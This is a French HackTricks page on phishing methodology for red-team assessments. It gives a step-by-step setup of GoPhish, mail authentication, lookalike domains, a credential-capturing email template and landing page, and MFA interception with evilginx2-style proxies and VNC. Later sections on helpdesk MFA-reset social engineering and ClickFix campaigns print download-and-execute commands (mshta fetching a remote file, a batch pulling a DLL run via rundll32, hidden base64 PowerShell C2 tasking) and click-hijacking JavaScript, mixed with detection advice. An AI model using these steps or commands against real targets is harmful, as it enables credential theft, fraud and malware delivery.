# Méthodologie de phishing

{{#include ../../banners/hacktricks-training.md}}

## Méthodologie

1. Faire de la reconnaissance sur la victime
   1. Sélectionner le **domaine de la victime**.
   2. Effectuer une énumération web de base pour **rechercher les portails de connexion** utilisés par la victime et **décider** lequel vous allez **usurper**.
   3. Utiliser des techniques d’**OSINT** pour **trouver des adresses e-mail**.
2. Préparer l’environnement
   1. **Acheter le domaine** que vous allez utiliser pour l’évaluation de phishing
   2. **Configurer les enregistrements liés au service de messagerie** (SPF, DMARC, DKIM, rDNS)
   3. Configurer le VPS avec **gophish**
3. Préparer la campagne
   1. Préparer le **modèle d’e-mail**
   2. Préparer la **page web** destinée à voler les identifiants
4. Lancer la campagne !

## Générer des noms de domaine similaires ou acheter un domaine réputé

### Techniques de variation des noms de domaine

- **Mot-clé** : Le nom de domaine **contient** un **mot-clé** important du domaine d’origine (par exemple, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **Sous-domaine avec trait d’union** : Remplacer le **point par un trait d’union** dans un sous-domaine (par exemple, www-zelster.com).
- **Nouvelle extension** : Utiliser le même domaine avec une **nouvelle extension** (par exemple, zelster.org)
- **Homoglyphe** : **Remplacer** une lettre du nom de domaine par des **lettres qui lui ressemblent** (par exemple, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition :** **Inverser deux lettres** du nom de domaine (par exemple, zelsetr.com).
- **Singularisation/Pluralisation** : Ajouter ou supprimer un « s » à la fin du nom de domaine (par exemple, zeltsers.com).
- **Omission** : **Supprimer une** des lettres du nom de domaine (par exemple, zelser.com).
- **Répétition :** **Répéter une** des lettres du nom de domaine (par exemple, zeltsser.com).
- **Remplacement** : Comme pour un homoglyphe, mais moins discret. Remplacer une lettre du nom de domaine, par exemple par une lettre proche de la lettre d’origine sur le clavier (par ex., zektser.com).
- **Insertion d’un sous-domaine** : Insérer un **point** dans le nom de domaine (par exemple, ze.lster.com).
- **Insertion** : **Insérer une lettre** dans le nom de domaine (par exemple, zerltser.com).
- **Point manquant** : Ajouter l’extension au nom de domaine (par exemple, zelstercom.com)

**Outils automatiques**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Sites web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Il est **possible que certains bits stockés ou transmis soient automatiquement inversés** en raison de divers facteurs, comme les éruptions solaires, les rayons cosmiques ou des erreurs matérielles.

Lorsque ce concept est **appliqué aux requêtes DNS**, il est possible que le **domaine reçu par le serveur DNS** ne soit pas le même que celui initialement demandé.

Par exemple, la modification d’un seul bit dans le domaine « windows.com » peut le transformer en « windnws.com ».

Les attaquants peuvent **en tirer parti en enregistrant plusieurs domaines obtenus par bitflipping**, similaires au domaine de la victime. Leur objectif est de rediriger les utilisateurs légitimes vers leur propre infrastructure.

Pour plus d’informations, consultez [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Acheter un domaine réputé

Vous pouvez rechercher un domaine expiré que vous pourriez utiliser sur [https://www.expireddomains.net/](https://www.expireddomains.net).\
Pour vous assurer que le domaine expiré que vous allez acheter **a déjà un bon SEO**, vous pouvez vérifier sa catégorie sur :

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Découvrir des adresses e-mail

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100 % gratuit)
- [https://phonebook.cz/](https://phonebook.cz) (100 % gratuit)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Pour **découvrir d’autres** adresses e-mail valides ou **vérifier celles** que vous avez déjà trouvées, vous pouvez vérifier s’il est possible de les deviner par brute force sur les serveurs SMTP de la victime. [Découvrez ici comment vérifier/trouver des adresses e-mail](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
De plus, n’oubliez pas que si les utilisateurs utilisent **un portail web pour accéder à leurs e-mails**, vous pouvez vérifier s’il est vulnérable au **brute force sur les noms d’utilisateur**, et exploiter cette vulnérabilité si possible.

## Configurer GoPhish

### Installation

Vous pouvez le télécharger depuis [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Téléchargez-le et décompressez-le dans `/opt/gophish`, puis exécutez `/opt/gophish/gophish`\
Un mot de passe pour l’utilisateur administrateur sur le port 3333 sera affiché dans la sortie. Accédez donc à ce port et utilisez ces identifiants pour modifier le mot de passe administrateur. Vous devrez peut-être transférer ce port vers localhost :

```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```

### Configuration

**Configuration du certificat TLS**

Avant cette étape, vous devriez avoir **déjà acheté le domaine** que vous allez utiliser et celui-ci doit **pointer** vers l’**IP du VPS** sur lequel vous configurez **gophish**.

```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```

**Configuration du mail**

Commencez par installer : `apt-get install postfix`

Ajoutez ensuite le domaine aux fichiers suivants :

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifiez également les valeurs des variables suivantes dans /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Enfin, modifiez les fichiers **`/etc/hostname`** et **`/etc/mailname`** pour y indiquer le nom de votre domaine, puis **redémarrez votre VPS.**

Créez maintenant un **enregistrement DNS A** pour `mail.<domain>` pointant vers **l’adresse IP** du VPS, ainsi qu’un **enregistrement DNS MX** pointant vers `mail.<domain>`.

Testons maintenant l’envoi d’un e-mail :

```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```

**Configuration de Gophish**

Arrêtez l’exécution de gophish et configurons-le.\
Modifiez `/opt/gophish/config.json` comme suit (notez l’utilisation de https) :

```bash
{
        "admin_server": {
                "listen_url": "127.0.0.1:3333",
                "use_tls": true,
                "cert_path": "gophish_admin.crt",
                "key_path": "gophish_admin.key"
        },
        "phish_server": {
                "listen_url": "0.0.0.0:443",
                "use_tls": true,
                "cert_path": "/opt/gophish/ssl_keys/key.crt",
                "key_path": "/opt/gophish/ssl_keys/key.pem"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {
                "filename": "",
                "level": ""
        }
}
```

**Configurer le service gophish**

Pour créer le service gophish afin qu’il puisse être démarré automatiquement et géré comme un service, vous pouvez créer le fichier `/etc/init.d/gophish` avec le contenu suivant :

```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
    echo 'Starting '${processName}'...'
    cd ${appDirectory}
    nohup ./$process >>$logfile 2>>$errfile &
    sleep 1
}

stop() {
    echo 'Stopping '${processName}'...'
    pid=$(/bin/pidof ${process})
    kill ${pid}
    sleep 1
}

status() {
    pid=$(/bin/pidof ${process})
    if [["$pid" != ""| "$pid" != "" ]]; then
        echo ${processName}' is running...'
    else
        echo ${processName}' is not running...'
    fi
}

case $1 in
    start|stop|status) "$1" ;;
esac
```

Terminez la configuration du service et vérifiez son fonctionnement en procédant comme suit :

```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```

## Configurer le serveur de messagerie et le domaine

### Patientez et restez crédible

Plus un domaine est ancien, moins il risque d’être détecté comme spam. Vous devriez donc attendre le plus longtemps possible (au moins 1 semaine) avant l’évaluation de phishing. De plus, si vous publiez une page sur un secteur réputé, la réputation obtenue sera meilleure.

Notez que même si vous devez attendre une semaine, vous pouvez terminer toute la configuration dès maintenant.

### Configurer l’enregistrement Reverse DNS (rDNS)

Définissez un enregistrement rDNS (PTR) qui associe l’adresse IP du VPS au nom de domaine.

### Enregistrement Sender Policy Framework (SPF)

Vous devez **configurer un enregistrement SPF pour le nouveau domaine**. Si vous ne savez pas ce qu’est un enregistrement SPF, [**consultez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Vous pouvez utiliser [https://www.spfwizard.net/](https://www.spfwizard.net) pour générer votre politique SPF (utilisez l’IP de la machine VPS).

![Formulaire SPF Wizard permettant de générer un enregistrement SPF pour un domaine de phishing](<../../images/image (1037).png>)

Voici le contenu à définir dans un enregistrement TXT du domaine :

```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```

### Enregistrement DMARC (Domain-based Message Authentication, Reporting & Conformance)

Vous devez **configurer un enregistrement DMARC pour le nouveau domaine**. Si vous ne savez pas ce qu’est un enregistrement DMARC, [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Vous devez créer un nouvel enregistrement DNS TXT pointant vers le nom d’hôte `_dmarc.<domain>` et contenant le texte suivant :

```bash
v=DMARC1; p=none
```

### DomainKeys Identified Mail (DKIM)

Vous devez **configurer un DKIM pour le nouveau domaine**. Si vous ne savez pas ce qu’est un enregistrement DKIM, [**lisez cette page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Ce tutoriel est basé sur : [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Vous devez concaténer les deux valeurs B64 générées par la clé DKIM :
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testez le score de configuration de votre e-mail

Vous pouvez le faire à l’aide de [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accédez simplement à la page et envoyez un e-mail à l’adresse qui vous est indiquée :

```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```

Vous pouvez également **vérifier la configuration de votre messagerie** en envoyant un e-mail à `check-auth@verifier.port25.com` et en **lisant la réponse** (pour cela, vous devrez **ouvrir** le port **25** et consulter la réponse dans le fichier _/var/mail/root_ si vous envoyez l’e-mail en tant que root).\
Vérifiez que vous réussissez tous les tests :

```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```

Vous pouvez également envoyer un **message à une adresse Gmail que vous contrôlez**, puis vérifier les **en-têtes de l’e-mail** dans votre boîte de réception Gmail : `dkim=pass` doit apparaître dans le champ d’en-tête `Authentication-Results`.

```
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
       dkim=pass header.i=@example.com;
```

### ​Suppression de la liste noire de Spamhouse

La page [www.mail-tester.com](https://www.mail-tester.com) peut vous indiquer si votre domaine est bloqué par Spamhouse. Vous pouvez demander le retrait de votre domaine/IP à l’adresse suivante : ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Suppression de la liste noire de Microsoft

​​Vous pouvez demander le retrait de votre domaine/IP à l’adresse [https://sender.office.com/](https://sender.office.com).

## Créer et lancer une campagne GoPhish

### Profil d’envoi

- Attribuez un **nom pour identifier** le profil d’envoi
- Choisissez le compte depuis lequel vous allez envoyer les e-mails de phishing. Suggestions : _noreply, support, servicedesk, salesforce..._
- Vous pouvez laisser le nom d’utilisateur et le mot de passe vides, mais veillez à cocher Ignore Certificate Errors

![Créer et lancer une campagne GoPhish - Profil d’envoi : vous pouvez laisser le nom d’utilisateur et le mot de passe vides, mais veillez à cocher Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Il est recommandé d’utiliser la fonctionnalité "**Send Test Email**" pour vérifier que tout fonctionne.\
> Je recommande d’**envoyer les e-mails de test à des adresses 10min mail** afin d’éviter de se faire mettre sur liste noire pendant les tests.

### Modèle d’e-mail

- Attribuez un **nom pour identifier** le modèle
- Rédigez ensuite un **objet** (rien d’étrange, simplement quelque chose que vous vous attendriez à lire dans un e-mail classique)
- Veillez à cocher "**Add Tracking Image**"
- Rédigez le **modèle d’e-mail** (vous pouvez utiliser des variables comme dans l’exemple suivant) :

```html
<html>
<head>
    <title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```

Notez que **pour renforcer la crédibilité de l’e-mail**, il est recommandé d’utiliser une signature tirée d’un e-mail du client. Suggestions :

- Envoyez un e-mail à une **adresse inexistante** et vérifiez si la réponse comporte une signature.
- Recherchez des **adresses e-mail publiques** comme info@ex.com, press@ex.com ou public@ex.com, envoyez-leur un e-mail et attendez une réponse.
- Essayez de contacter une adresse e-mail **valide découverte** et attendez une réponse.

![Profil d’envoi - Modèle d’e-mail : essayez de contacter une adresse e-mail valide découverte et attendez une réponse](<../../images/image (80).png>)

> [!TIP]
> Le modèle d’e-mail permet également **de joindre des fichiers**. Si vous souhaitez aussi voler des défis NTLM à l’aide de fichiers/documents spécialement conçus, [consultez cette page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Page d’atterrissage

- Indiquez un **nom**
- **Écrivez le code HTML** de la page Web. Notez que vous pouvez **importer** des pages Web.
- Cochez **Capture Submitted Data** et **Capture Passwords**
- Définissez une **redirection**

![Modèle d’e-mail - Page d’atterrissage : cochez Capture Submitted Data et Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> En général, vous devrez modifier le code HTML de la page et effectuer quelques tests en local (par exemple, à l’aide d’un serveur Apache) **jusqu’à obtenir le résultat souhaité.** Ensuite, écrivez ce code HTML dans la zone de texte.\
> Notez que si vous devez **utiliser des ressources statiques** pour le HTML (par exemple, des pages CSS et JS), vous pouvez les enregistrer dans _**/opt/gophish/static/endpoint**_, puis y accéder depuis _**/static/\<filename>**_

> [!TIP]
> Pour la redirection, vous pouvez **rediriger les utilisateurs vers la page Web principale légitime** de la victime, ou les rediriger vers _/static/migration.html_, par exemple, afficher une **roue de chargement (**[**https://loading.io/**](https://loading.io)**) pendant 5 secondes, puis indiquer que le processus a réussi**.

### Utilisateurs et groupes

- Indiquez un nom
- **Importez les données** (notez que pour utiliser le modèle de cet exemple, vous devez disposer du prénom, du nom et de l’adresse e-mail de chaque utilisateur)

![Page d’atterrissage - Utilisateurs et groupes : importez les données (notez que pour utiliser le modèle de cet exemple, vous devez disposer du prénom, du nom et de l’adresse e-mail de chaque utilisateur)](<../../images/image (163).png>)

### Campagne

Enfin, créez une campagne en sélectionnant un nom, le modèle d’e-mail, la page d’atterrissage, l’URL, le profil d’envoi et le groupe. Notez que l’URL correspondra au lien envoyé aux victimes.

Notez que le **profil d’envoi permet d’envoyer un e-mail de test pour voir à quoi ressemblera l’e-mail de phishing final** :

![Utilisateurs et groupes - Campagne : notez que le profil d’envoi permet d’envoyer un e-mail de test pour voir à quoi ressemblera l’e-mail de phishing final](<../../images/image (192).png>)

Une fois que tout est prêt, lancez la campagne !

## Clonage de site Web

Si, pour une raison quelconque, vous souhaitez cloner le site Web, consultez la page suivante :


{{#ref}}
clone-a-website.md
{{#endref}}

## Documents et fichiers backdoorés

Lors de certaines évaluations de phishing (principalement pour les Red Teams), vous voudrez également **envoyer des fichiers contenant une sorte de backdoor** (peut-être un C2 ou simplement quelque chose qui déclenchera une authentification).\
Consultez la page suivante pour quelques exemples :


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via un proxy MitM

L’attaque précédente est assez ingénieuse, car vous simulez un vrai site Web et récupérez les informations saisies par l’utilisateur. Malheureusement, si l’utilisateur n’a pas saisi le bon mot de passe ou si l’application que vous avez simulée est configurée avec la 2FA, **ces informations ne vous permettront pas d’usurper l’identité de l’utilisateur piégé**.

C’est là que des outils comme [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) et [**muraena**](https://github.com/muraenateam/muraena) sont utiles. Cet outil vous permet de lancer une attaque de type MitM. En gros, l’attaque fonctionne de la manière suivante :

1. Vous **usurpez le formulaire de connexion** de la vraie page Web.
2. L’utilisateur **envoie** ses **identifiants** à votre fausse page, et l’outil les transmet à la vraie page Web, **en vérifiant si les identifiants fonctionnent**.
3. Si le compte est configuré avec la **2FA**, la page MitM la demandera et, une fois que **l’utilisateur l’aura saisie**, l’outil la transmettra à la vraie page Web.
4. Une fois l’utilisateur authentifié, vous (en tant qu’attaquant) aurez **capturé les identifiants, la 2FA, le cookie et toutes les informations échangées lors de vos interactions pendant que l’outil effectue une attaque MitM**.

### Via VNC

Et si, au lieu **d’envoyer la victime vers une page malveillante** ayant la même apparence que l’originale, vous l’envoyiez vers une **session VNC avec un navigateur connecté à la vraie page Web** ? Vous pourriez voir ce qu’elle fait, voler le mot de passe, la MFA utilisée, les cookies...\
Vous pouvez faire cela avec [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Détecter la détection

Évidemment, l’un des meilleurs moyens de savoir si vous avez été repéré est de **rechercher votre domaine dans les listes noires**. S’il y figure, votre domaine a été détecté comme suspect.\
Un moyen simple de vérifier si votre domaine figure dans une liste noire consiste à utiliser [https://malwareworld.com/](https://malwareworld.com)

Cependant, il existe d’autres façons de savoir si la victime **recherche activement des activités de phishing suspectes sur Internet**, comme expliqué dans :


{{#ref}}
detecting-phising.md
{{#endref}}

Vous pouvez **acheter un domaine dont le nom ressemble beaucoup** à celui du domaine de la victime **et/ou générer un certificat** pour un **sous-domaine** d’un domaine que vous contrôlez **contenant** le **mot-clé** du domaine de la victime. Si la **victime** effectue une quelconque **interaction DNS ou HTTP** avec ces domaines, vous saurez qu’elle **recherche activement** des domaines suspects et que vous devrez rester très discret.<sup>[[2]](#references)</sup>

### Évaluer le phishing

Utilisez [**Phishious** ](https://github.com/Rices/Phishious)pour évaluer si votre e-mail finira dans le dossier des spams, sera bloqué ou aboutira.

## Compromission d’identité avec interaction directe (réinitialisation MFA par le service d’assistance)

Les groupes d’intrusion modernes évitent de plus en plus complètement les leurres par e-mail et **ciblent directement le processus du service d’assistance/de récupération d’identité** pour contourner la MFA. L’attaque repose entièrement sur le « living off the land » : dès que l’opérateur possède des identifiants valides, il pivote à l’aide des outils d’administration intégrés ; aucun malware n’est nécessaire.<sup>[[6]](#references)</sup>

### Déroulement de l’attaque
1. Effectuez la reconnaissance de la victime 
   * Recueillez des informations personnelles et professionnelles sur LinkedIn, dans des fuites de données, sur GitHub public, etc.  
   * Identifiez les identités à forte valeur (dirigeants, informatique, finance) et déterminez le **processus exact du service d’assistance** pour la réinitialisation du mot de passe/de la MFA.
2. Ingénierie sociale en temps réel  
   * Appelez le service d’assistance ou contactez-le sur Teams ou par chat en vous faisant passer pour la cible (souvent avec un **identifiant d’appelant usurpé** ou une **voix clonée**).  
   * Fournissez les informations personnelles identifiantes recueillies précédemment pour réussir la vérification fondée sur des questions.  
   * Convainquez l’agent de **réinitialiser le secret MFA** ou d’effectuer un **SIM-swap** sur un numéro de mobile enregistré.
3. Actions immédiates après l’accès (≤60 min dans les cas réels)  
   * Établissez un point d’appui via n’importe quel portail Web SSO.  
   * Énumérez AD / AzureAD à l’aide des outils intégrés (aucun binaire n’est déposé) :
     ```powershell
     # list directory groups & privileged roles
     Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

     # AzureAD / Graph – list directory roles
     Get-MgDirectoryRole | ft DisplayName,Id

     # Enumerate devices the account can login to
     Get-MgUserRegisteredDevice -UserId <user@corp.local>
     ```
   * Mouvement latéral avec **WMI**, **PsExec** ou des agents **RMM** légitimes déjà autorisés dans l’environnement.

### Détection et atténuation
* Traiter la récupération d’identité par le support comme une **opération privilégiée** : exiger une authentification renforcée et l’approbation d’un responsable.
* Déployer des règles **Identity Threat Detection & Response (ITDR)** / **UEBA** qui déclenchent une alerte en cas de :  
  * changement de méthode MFA + authentification depuis un nouvel appareil ou une nouvelle zone géographique ;
  * élévation immédiate du même principal (user-→-admin).
* Enregistrer les appels au support et exiger un **rappel à un numéro déjà enregistré** avant toute réinitialisation.
* Mettre en place un accès **Just-In-Time (JIT) / Privileged Access** afin que les comptes nouvellement réinitialisés n’héritent **pas** automatiquement de jetons hautement privilégiés.

---

## Tromperie à grande échelle – Empoisonnement SEO et campagnes « ClickFix »
Les groupes opportunistes compensent le coût des opérations ciblées en menant des attaques de masse qui transforment les **moteurs de recherche et les réseaux publicitaires en vecteurs de diffusion**.<sup>[[6]](#references)</sup>

1. L’**empoisonnement SEO / malvertising** place un faux résultat, comme `chromium-update[.]site`, en tête des annonces de recherche.
2. La victime télécharge un petit **loader de première étape** (souvent JS/HTA/ISO). Exemples observés par Unit 42 :
   * `RedLine stealer`
   * `Lumma stealer`
   * `Lampion Trojan`
3. Le loader exfiltre les cookies du navigateur et les bases de données d’identifiants, puis récupère un **loader furtif** qui décide — *en temps réel* — de déployer ou non :
   * un RAT (p. ex. AsyncRAT, RustDesk)
   * un ransomware / wiper
   * un composant de persistance (clé Run du registre + tâche planifiée)

### Conseils de renforcement
* Bloquer les domaines récemment enregistrés et appliquer le **filtrage DNS avancé / filtrage d’URL** aux *annonces de recherche* comme aux e-mails.
* Limiter l’installation de logiciels aux packages MSI signés / du Store, et interdire l’exécution de `HTA`, `ISO`, `VBS` par stratégie.
* Surveiller les processus enfants des navigateurs qui ouvrent des programmes d’installation :
  ```yaml
  - parent_image: /Program Files/Google/Chrome/*
    and child_image: *\\*.exe
  ```
* Recherchez les LOLBins fréquemment utilisés par les chargeurs de première étape (p. ex. `regsvr32`, `curl`, `mshta`).

### Détournement du clic sur le bouton de téléchargement avec bascule TDS
Certains faux portails logiciels conservent le lien `href` visible pointant vers la **véritable** URL GitHub/de la release, mais détournent la **première** interaction de l’utilisateur en JavaScript et redirigent la victime vers une chaîne de **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>

```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
  if (!isEligibleClick(e.target)) return;
  cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
  e.stopImmediatePropagation();
  e.preventDefault();
}, true);
```

Key traits:
- Le hook s’exécute généralement pendant la **phase de capture** (`true`) sur `document`, avant les gestionnaires du site.
- Chrome utilise souvent `mousedown` plutôt que `click` pour que la redirection reste liée à un **geste utilisateur** valide et contourne plus facilement les bloqueurs de pop-ups.
- Certaines variantes ouvrent d’abord `about:blank` ou simulent des clics sur `<a target="_blank">`, puis ne définissent l’URL du TDS que plus tard.
- Les limites côté navigateur sont souvent stockées dans `localStorage` : le **premier clic** peut mener au malware, tandis que les actualisations et nouvelles tentatives renvoient vers le lien visible d’apparence inoffensive.
- Le TDS peut appliquer des filtres selon le référent, le domaine d’entrée, la GEO, l’empreinte du navigateur/de l’appareil, les contrôles VPN/datacenter, le contexte du clic et les compteurs par session, ce qui rend les relectures par les analystes non déterministes.

Idées pour les défenseurs :
- Comparez le `href` **affiché** à la cible de navigation **réelle** générée au moment du clic.
- Recherchez les gestionnaires `document.addEventListener(..., true)` qui appellent à la fois `preventDefault()` et `stopImmediatePropagation()` autour de `window.open`, `about:blank` ou de clics synthétiques sur des ancres.
- Considérez les groupes de domaines de téléchargement de logiciels récemment enregistrés, qui chargent tous le même stage CloudFront/JS, comme un indicateur fort d’un empoisonnement SEO/TDS.

### ClickFix à partir de fausses pages de vérification + récupérations LOLBAS d’apparence archivistique
Certaines branches du TDS aboutissent à une fausse page de vérification (de style Cloudflare/IUAM) qui demande à la victime d’exécuter un binaire Windows fiable tel que :<sup>[[9]](#references)</sup>

```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```

Notes :
- `mshta.exe` exécute le **HTA/VBScript au début de la réponse**, même si l’URL prétend pointer vers une archive `.7z` ; les données d’archive ajoutées peuvent n’être qu’un leurre.
- Les étapes suivantes continuent souvent à mentir sur le type de fichier (`.rtf` pour PowerShell, `.asar` pour Python, ZIP contenant des binaires avec du padding), puis passent au **manual PE mapping / in-memory execution**.
- Si vous répondez à l’une de ces chaînes, préservez le **réseau + la mémoire dès la première exécution réussie** : les rejeux ultérieurs peuvent ne montrer qu’un parcours bénin d’installateur/SFX ou échouer parce que la libération de la payload/clé était liée à la session TDS d’origine.

### Tactiques de livraison de DLL ClickFix (fausse mise à jour du CERT)
* Appât : avis cloné d’un CERT national avec un bouton **Update** qui affiche des instructions de « correction » étape par étape. Les victimes sont invitées à exécuter un batch qui télécharge une DLL et l’exécute via `rundll32`.<sup>[[12]](#references)</sup>
* Chaîne de batch typique observée :
  ```cmd
  echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
  echo timeout /t 10
  echo rundll32.exe "%TEMP%\notepad2.dll",notepad
  ```
  * `Invoke-WebRequest` dépose le payload dans `%TEMP%`, un court sleep masque la gigue réseau, puis `rundll32` appelle le point d’entrée exporté (`notepad`).
* La DLL signale l’identité de l’hôte et interroge le C2 toutes les quelques minutes. Les tâches distantes arrivent sous forme de **PowerShell encodé en base64**, exécuté en mode caché et avec contournement de la stratégie :
  ```powershell
  powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
  ```
  * Cela préserve la flexibilité du C2 (le serveur peut remplacer les tâches sans mettre à jour la DLL) et masque les fenêtres de console. Recherchez les processus PowerShell enfants de `rundll32.exe` qui utilisent ensemble `-WindowStyle Hidden`, `FromBase64String` et `Invoke-Expression`.
* Les défenseurs peuvent rechercher des callbacks HTTP(S) de la forme `...page.php?tynor=<COMPUTER>sss<USER>` et des intervalles de polling de 5 minutes après le chargement de la DLL.

---

## Opérations de phishing améliorées par l’IA
Les attaquants combinent désormais **des API de LLM et de clonage vocal** pour créer des leurres entièrement personnalisés et interagir en temps réel.

| Couche | Exemple d’utilisation par un acteur malveillant |
|-------|-----------------------------|
|Automatisation|Générer et envoyer plus de 100 k e-mails / SMS aux formulations aléatoires et contenant des liens de suivi.|
|IA générative|Produire des e-mails *uniques* faisant référence à des fusions-acquisitions publiques et à des plaisanteries internes repérées sur les réseaux sociaux ; utiliser la voix deepfake d’un PDG dans une arnaque par rappel.|
|IA agentique|Enregistrer des domaines de manière autonome, collecter des renseignements open source et rédiger des e-mails de suivi lorsqu’une victime clique sans fournir ses identifiants.|

**Défense :**  
• Ajouter des **bannières dynamiques** signalant les messages envoyés par une automatisation non fiable (à l’aide des anomalies ARC/DKIM).  
• Déployer des **phrases de défi biométrique vocal** pour les demandes téléphoniques à haut risque.  
• Simuler continuellement des leurres générés par IA dans les programmes de sensibilisation : les modèles statiques sont obsolètes.

Voir aussi – abus de la navigation agentique pour le phishing d’identifiants :

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Voir aussi – abus des outils CLI locaux et MCP par les agents IA (pour l’inventaire des secrets et la détection) :

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Assemblage à l’exécution de JavaScript de phishing assisté par LLM (génération de code dans le navigateur)

